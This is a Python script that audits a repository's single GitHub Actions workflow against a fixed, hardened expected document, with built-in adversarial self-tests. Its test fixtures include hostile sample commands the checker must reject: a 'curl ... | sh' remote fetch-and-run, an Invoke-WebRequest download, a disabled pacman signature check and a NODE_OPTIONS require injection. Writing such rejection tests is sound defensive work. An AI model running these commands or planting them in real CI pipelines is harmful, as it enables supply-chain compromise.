#!/usr/bin/env python3
"""Offline semantic admission for the repository's only executable workflow.

Workflow source is restricted to strict JSON, which is a YAML 1.2 subset. This
removes aliases, implicit typing, duplicate keys, and block-scalar ambiguity.
The admitted document runs a protected-base checker against inert candidate
bytes; it never executes candidate scripts, actions, containers, or services.
"""

from __future__ import annotations

import argparse
import json
import sys
import tempfile
from pathlib import Path, PurePosixPath
from typing import Any


AUDITED_ACTION_PINS = {
    "actions/checkout": "11d5960a326750d5838078e36cf38b85af677262",
    "actions/download-artifact": "d3f86a106a0bac45b974a628896c90dbdf5c8093",
    "actions/setup-python": "a26af69be951a213d495a4c3e4e4022e16d87065",
    "actions/upload-artifact": "ea165f8d65b6e75b540449e92b4886f43607fa02",
    "al-cheb/configure-pagefile-action": "a3b6ebd6b634da88790d9c58d4b37a7f4a7b8708",
    "msys2/setup-msys2": "66cd2cce69caa17b53920067426061ca1de3a884",
}
WORKFLOW_SUFFIXES = {".yml", ".yaml"}
MAX_SOURCE_BYTES = 1_000_000
EXPECTED_BRANCHES = ["master", "crutkas-arm64-ci-action-pins"]
EXPECTED_TYPES = ["opened", "synchronize", "reopened", "ready_for_review"]
CHECKOUT_PIN = (
    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
)
TRUSTED_ROOT = (
    "trusted-${{ github.run_id }}-${{ github.run_attempt }}-"
    "${{ github.job }}-nomatrix"
)
CANDIDATE_ROOT = (
    "candidate-${{ github.run_id }}-${{ github.run_attempt }}-"
    "${{ github.job }}-nomatrix"
)
CHECKER_RUN = (
    'python3 -I -B "$GITHUB_WORKSPACE/$TRUSTED_ROOT/'
    '.ci/check-workflow-hardening.py" --self-test\n'
    'python3 -I -B "$GITHUB_WORKSPACE/$TRUSTED_ROOT/'
    '.ci/check-workflow-hardening.py" '
    '--repo "$GITHUB_WORKSPACE/$CANDIDATE_ROOT"'
)


class DuplicateKeyError(ValueError):
    pass


def strict_object(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise DuplicateKeyError(f"duplicate mapping key {key!r}")
        result[key] = value
    return result


def checkout_inputs(repository: str, ref: str, path: str) -> dict[str, Any]:
    return {
        "repository": repository,
        "ref": ref,
        "path": path,
        "persist-credentials": False,
        "fetch-depth": 1,
        "lfs": False,
        "submodules": False,
        "clean": True,
        "set-safe-directory": False,
        "show-progress": False,
    }


def admitted_workflow() -> dict[str, Any]:
    return {
        "name": "trusted-base-workflow-source-audit",
        "on": {
            "pull_request_target": {
                "branches": EXPECTED_BRANCHES,
                "types": EXPECTED_TYPES,
            }
        },
        "permissions": {},
        "concurrency": {
            "group": (
                "trusted-base-workflow-source-audit-"
                "${{ github.event.pull_request.number }}-"
                "${{ github.event.pull_request.head.sha }}"
            ),
            "cancel-in-progress": True,
        },
        "jobs": {
            "offline-source-audit": {
                "name": (
                    "Trusted-base source audit "
                    "(candidate bytes are never executed)"
                ),
                "runs-on": "ubuntu-24.04",
                "permissions": {"contents": "read"},
                "timeout-minutes": 5,
                "steps": [
                    {
                        "name": "Checkout trusted base without credentials",
                        "uses": CHECKOUT_PIN,
                        "with": checkout_inputs(
                            "${{ github.repository }}",
                            "${{ github.event.pull_request.base.sha }}",
                            TRUSTED_ROOT,
                        ),
                    },
                    {
                        "name": "Checkout exact candidate head as inert input",
                        "uses": CHECKOUT_PIN,
                        "with": checkout_inputs(
                            "${{ github.event.pull_request.head.repo.full_name }}",
                            "${{ github.event.pull_request.head.sha }}",
                            CANDIDATE_ROOT,
                        ),
                    },
                    {
                        "name": "Parse candidate source with trusted checker",
                        "shell": "bash",
                        "env": {
                            "TRUSTED_ROOT": TRUSTED_ROOT,
                            "CANDIDATE_ROOT": CANDIDATE_ROOT,
                        },
                        "run": CHECKER_RUN,
                    },
                ],
            }
        },
    }


def checked_path(
    root: Path,
    path: Path,
    label: str,
    findings: list[str],
    *,
    require_file: bool,
) -> Path | None:
    try:
        relative = path.relative_to(root)
    except ValueError:
        findings.append(f"{label}: path escapes the candidate repository")
        return None

    current = root
    for part in relative.parts:
        current = current / part
        is_junction = getattr(current, "is_junction", lambda: False)
        if current.is_symlink() or is_junction():
            findings.append(f"{label}: symlink/reparse paths are not admitted")
            return None

    if require_file and not path.is_file():
        findings.append(f"{label}: required regular file is missing")
        return None
    if not require_file and not path.is_dir():
        findings.append(f"{label}: required directory is missing")
        return None

    try:
        resolved = path.resolve(strict=True)
    except OSError as error:
        findings.append(f"{label}: cannot resolve path: {error}")
        return None
    if not resolved.is_relative_to(root):
        findings.append(f"{label}: resolved path escapes the repository")
        return None
    if require_file and resolved.stat().st_size > MAX_SOURCE_BYTES:
        findings.append(
            f"{label}: source exceeds the {MAX_SOURCE_BYTES}-byte limit"
        )
        return None
    return resolved


def display(value: Any) -> str:
    rendered = repr(value)
    return rendered if len(rendered) <= 160 else rendered[:157] + "..."


def semantic_differences(
    actual: Any, expected: Any, path: str = "$"
) -> list[str]:
    if type(actual) is not type(expected):
        return [
            f"{path}: expected {type(expected).__name__}, "
            f"found {type(actual).__name__}"
        ]
    if isinstance(expected, dict):
        findings: list[str] = []
        for key in sorted(expected.keys() - actual.keys()):
            findings.append(f"{path}: missing key {key!r}")
        for key in sorted(actual.keys() - expected.keys()):
            findings.append(f"{path}: unexpected key {key!r}")
        for key in sorted(expected.keys() & actual.keys()):
            findings.extend(
                semantic_differences(actual[key], expected[key], f"{path}.{key}")
            )
        return findings
    if isinstance(expected, list):
        findings = []
        if len(actual) != len(expected):
            findings.append(
                f"{path}: expected {len(expected)} item(s), found {len(actual)}"
            )
        for index, (actual_item, expected_item) in enumerate(
            zip(actual, expected)
        ):
            findings.extend(
                semantic_differences(
                    actual_item, expected_item, f"{path}[{index}]"
                )
            )
        return findings
    if actual != expected:
        return [
            f"{path}: expected {display(expected)}, found {display(actual)}"
        ]
    return []


def parse_workflow(path: Path, findings: list[str]) -> dict[str, Any] | None:
    label = path.name
    try:
        content = path.read_text(encoding="utf-8")
        document = json.loads(content, object_pairs_hook=strict_object)
    except (
        OSError,
        UnicodeError,
        json.JSONDecodeError,
        DuplicateKeyError,
    ) as error:
        findings.append(
            f"{label}: must be one strict-JSON YAML 1.2 mapping: {error}"
        )
        return None
    if not isinstance(document, dict):
        findings.append(f"{label}: workflow root must be a mapping")
        return None
    return document


def audit_repository(root: Path, trusted_checker: Path) -> list[str]:
    findings: list[str] = []
    root = root.resolve(strict=True)
    trusted_checker = trusted_checker.resolve(strict=True)

    expected_pins = {
        "actions/checkout": "11d5960a326750d5838078e36cf38b85af677262",
        "actions/download-artifact": "d3f86a106a0bac45b974a628896c90dbdf5c8093",
        "actions/setup-python": "a26af69be951a213d495a4c3e4e4022e16d87065",
        "actions/upload-artifact": "ea165f8d65b6e75b540449e92b4886f43607fa02",
        "al-cheb/configure-pagefile-action": (
            "a3b6ebd6b634da88790d9c58d4b37a7f4a7b8708"
        ),
        "msys2/setup-msys2": (
            "66cd2cce69caa17b53920067426061ca1de3a884"
        ),
    }
    if AUDITED_ACTION_PINS != expected_pins:
        findings.append("checker: the six lower-layer action pins changed")

    candidate_checker = checked_path(
        root,
        root / ".ci" / "check-workflow-hardening.py",
        ".ci/check-workflow-hardening.py",
        findings,
        require_file=True,
    )
    if candidate_checker is not None:
        try:
            if candidate_checker.read_bytes() != trusted_checker.read_bytes():
                findings.append(
                    ".ci/check-workflow-hardening.py: candidate checker must "
                    "byte-match the protected-base checker"
                )
        except OSError as error:
            findings.append(f"checker: cannot compare checker bytes: {error}")

    workflow_dir = checked_path(
        root,
        root / ".github" / "workflows",
        ".github/workflows",
        findings,
        require_file=False,
    )
    if workflow_dir is None:
        return sorted(set(findings))

    candidates = sorted(
        path
        for path in workflow_dir.iterdir()
        if path.suffix.lower() in WORKFLOW_SUFFIXES
    )
    if len(candidates) != 1:
        findings.append(
            ".github/workflows: exactly one .yml/.yaml workflow is admitted; "
            f"found {len(candidates)}"
        )

    expected = admitted_workflow()
    for candidate in candidates:
        workflow = checked_path(
            root,
            candidate,
            candidate.name,
            findings,
            require_file=True,
        )
        if workflow is None:
            continue
        document = parse_workflow(workflow, findings)
        if document is not None:
            findings.extend(
                f"{candidate.name}: {finding}"
                for finding in semantic_differences(document, expected)
            )

    unique = sorted(set(findings))
    if len(unique) > 100:
        return unique[:100] + [
            f"audit: {len(unique) - 100} additional finding(s) suppressed"
        ]
    return unique


def clone(document: dict[str, Any]) -> dict[str, Any]:
    return json.loads(json.dumps(document))


def write_fixture(
    root: Path,
    *,
    document: dict[str, Any] | None = None,
    workflow_text: str | None = None,
    extension: str = ".yml",
    files: dict[str, str] | None = None,
) -> None:
    workflow_dir = root / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    workflow = workflow_dir / f"main{extension}"
    if workflow_text is None:
        workflow_text = json.dumps(
            document if document is not None else admitted_workflow(),
            indent=2,
        )
    workflow.write_text(workflow_text + "\n", encoding="utf-8")

    checker = root / ".ci" / "check-workflow-hardening.py"
    checker.parent.mkdir(parents=True)
    checker.write_bytes(Path(__file__).read_bytes())
    for relative, content in (files or {}).items():
        target = root.joinpath(*PurePosixPath(relative).parts)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")


def fixture_findings(**kwargs: Any) -> list[str]:
    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary)
        write_fixture(root, **kwargs)
        return audit_repository(root, Path(__file__))


def expect_clean(label: str, **kwargs: Any) -> None:
    findings = fixture_findings(**kwargs)
    if findings:
        raise AssertionError(f"{label} unexpectedly failed: {'; '.join(findings)}")


def expect_rejected(label: str, expected: str, **kwargs: Any) -> None:
    findings = fixture_findings(**kwargs)
    if not any(expected in finding for finding in findings):
        raise AssertionError(
            f"{label} did not report {expected!r}: {'; '.join(findings)}"
        )


def run_self_tests() -> None:
    expect_clean("strict JSON .yml", document=admitted_workflow())
    expect_clean(
        "strict JSON .yaml",
        document=admitted_workflow(),
        extension=".yaml",
    )

    invalid_yaml = {
        "alias": (
            "name: alias\non: &event\n  pull_request_target: {}\n"
            "permissions: {}\njobs: *event"
        ),
        "single quote": (
            "name: 'quoted'\non: {pull_request_target: {}}\n"
            "permissions: {}\njobs: {}"
        ),
        "block scalar": (
            "name: block\non: {pull_request_target: {}}\n"
            "permissions: {}\njobs:\n  audit:\n    steps:\n"
            "      - run: |\n          echo ambiguous"
        ),
        "duplicate key": (
            '{"name":"first","name":"second","on":{},'
            '"permissions":{},"jobs":{}}'
        ),
    }
    for label, source in invalid_yaml.items():
        expect_rejected(
            label,
            "strict-JSON YAML 1.2 mapping",
            workflow_text=source,
        )

    run_cases = {
        "mutable URL": (
            "Invoke-WebRequest https://example.invalid/Procdump.zip"
        ),
        "remote shell payload": (
            "curl https://raw.githubusercontent.invalid/grype/main | sh"
        ),
        "mutable git acquisition": "git fetch origin main",
        "floating package operation": "pacman -S floating-package",
        "weak signature": "echo 'SigLevel = Never' > pacman.conf",
        "shared root": "mkdir C:\\M\\packages",
        "unsupported setup value": "echo MINGWARM64",
        "publication command": (
            "gh release upload srcinfo-cache unverified.bin --clobber"
        ),
        "candidate checker execution": (
            "python3 .ci/check-workflow-hardening.py"
        ),
        "transitive .ci delegation": "bash .ci/outer.sh",
    }
    for label, command in run_cases.items():
        document = clone(admitted_workflow())
        document["jobs"]["offline-source-audit"]["steps"][2]["run"] = command
        files = None
        if label == "transitive .ci delegation":
            files = {
                ".ci/outer.sh": "source .ci/inner.sh\n",
                ".ci/inner.sh": "git fetch origin main\n",
            }
        expect_rejected(
            label,
            "$.jobs.offline-source-audit.steps[2].run",
            document=document,
            files=files,
        )

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"][0]["uses"] = (
        "actions/checkout@main"
    )
    expect_rejected(
        "floating action",
        "$.jobs.offline-source-audit.steps[0].uses",
        document=document,
    )

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"][1]["env"] = {
        "NODE_OPTIONS": "--require ./candidate.js"
    }
    expect_rejected(
        "action environment injection",
        "unexpected key 'env'",
        document=document,
    )

    for trigger in (
        "pull_request",
        "workflow_dispatch",
        "workflow_call",
        "schedule",
        "release",
        "push",
    ):
        document = clone(admitted_workflow())
        document["on"] = {trigger: {}}
        expect_rejected(
            f"{trigger} route",
            "$.on",
            document=document,
        )

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["permissions"] = {
        "contents": "write"
    }
    expect_rejected(
        "write token",
        "$.jobs.offline-source-audit.permissions.contents",
        document=document,
    )

    for key, value in (
        ("container", "ubuntu:latest"),
        ("services", {"database": {"image": "postgres:latest"}}),
        ("strategy", {"matrix": {"msystem": ["MINGWARM64"]}}),
        ("if", False),
    ):
        document = clone(admitted_workflow())
        document["jobs"]["offline-source-audit"][key] = value
        expect_rejected(
            f"job {key}",
            f"unexpected key {key!r}",
            document=document,
        )

    delegated_steps = {
        "permissive artifact producer": {
            "uses": (
                "actions/upload-artifact@"
                "ea165f8d65b6e75b540449e92b4886f43607fa02"
            ),
            "with": {
                "name": "packages",
                "path": "artifacts/*",
                "if-no-files-found": "ignore",
            },
        },
        "ambiguous artifact consumer": {
            "uses": (
                "actions/download-artifact@"
                "d3f86a106a0bac45b974a628896c90dbdf5c8093"
            ),
            "with": {"pattern": "result-*", "merge-multiple": True},
        },
        "cached runtime setup": {
            "uses": (
                "actions/setup-python@"
                "a26af69be951a213d495a4c3e4e4022e16d87065"
            ),
            "with": {"python-version": "3.12", "cache": "pip"},
        },
        "mutable MSYS2 setup": {
            "uses": (
                "msys2/setup-msys2@"
                "66cd2cce69caa17b53920067426061ca1de3a884"
            ),
            "with": {
                "msystem": "MINGWARM64",
                "location": "D:\\M",
                "update": True,
            },
        },
        "local action": {"uses": "./.github/actions/local"},
        "Docker action": {"uses": "./.github/actions/docker"},
    }
    for label, step in delegated_steps.items():
        document = clone(admitted_workflow())
        document["jobs"]["offline-source-audit"]["steps"].append(step)
        files = None
        if label == "local action":
            files = {
                ".github/actions/local/action.yml": (
                    '{"name":"local","runs":{"using":"composite",'
                    '"steps":[{"run":"curl example.invalid","shell":"bash"}]}}'
                )
            }
        elif label == "Docker action":
            files = {
                ".github/actions/docker/action.yaml": (
                    '{"name":"docker","runs":{"using":"docker",'
                    '"image":"Dockerfile"}}'
                ),
                ".github/actions/docker/Dockerfile": (
                    "FROM ubuntu:latest\nRUN curl example.invalid\n"
                ),
            }
        expect_rejected(
            label,
            "$.jobs.offline-source-audit.steps: expected 3 item(s)",
            document=document,
            files=files,
        )

    document = clone(admitted_workflow())
    document["jobs"]["reusable"] = {
        "uses": "./.github/workflows/reusable.yaml"
    }
    expect_rejected(
        "reusable workflow",
        "unexpected key 'reusable'",
        document=document,
        files={
            ".github/workflows/reusable.yaml": (
                '{"name":"reusable","on":{"workflow_call":{}},"jobs":{}}'
            )
        },
    )

    document = clone(admitted_workflow())
    document["jobs"]["offline-source-audit"]["steps"][0][
        "continue-on-error"
    ] = True
    expect_rejected(
        "permissive action failure",
        "unexpected key 'continue-on-error'",
        document=document,
    )

    expect_rejected(
        "candidate checker mutation",
        "candidate checker must byte-match the protected-base checker",
        document=admitted_workflow(),
        files={
            ".ci/check-workflow-hardening.py": (
                "#!/usr/bin/env python3\nprint('candidate no-op')\n"
            )
        },
    )

    expect_rejected(
        "additional .yaml workflow",
        "exactly one .yml/.yaml workflow is admitted",
        document=admitted_workflow(),
        files={
            ".github/workflows/extra.yaml": (
                '{"name":"extra","on":{"workflow_dispatch":{}},"jobs":{}}'
            )
        },
    )
    print("Workflow hardening adversarial self-tests passed.")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Audit the exact trusted-base workflow admission document"
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="run offline semantic adversarial fixtures",
    )
    parser.add_argument(
        "--repo",
        type=Path,
        help="candidate repository root to parse without executing its files",
    )
    args = parser.parse_args()
    if args.self_test:
        run_self_tests()
        return 0

    repo_root = (
        args.repo.resolve(strict=True)
        if args.repo is not None
        else Path(__file__).resolve().parent.parent
    )
    if not repo_root.is_dir():
        parser.error(f"repository root is not a directory: {repo_root}")

    findings = audit_repository(repo_root, Path(__file__))
    if findings:
        for finding in findings:
            print(f"ERROR: {finding}")
        print(
            f"Workflow hardening audit failed with {len(findings)} finding(s).",
            file=sys.stderr,
        )
        return 1

    print(
        "Validated one strict-JSON workflow, two exact checkout pins, "
        "and zero candidate executable paths."
    )
    print(
        "The six lower-layer action pin mappings remain exact; package, "
        "artifact, publication, container, service, cache, and mutable "
        "acquisition paths are unreachable."
    )
    print(
        "This check is not authoritative until its trusted copy is merged "
        "to a protected base and required by policy."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
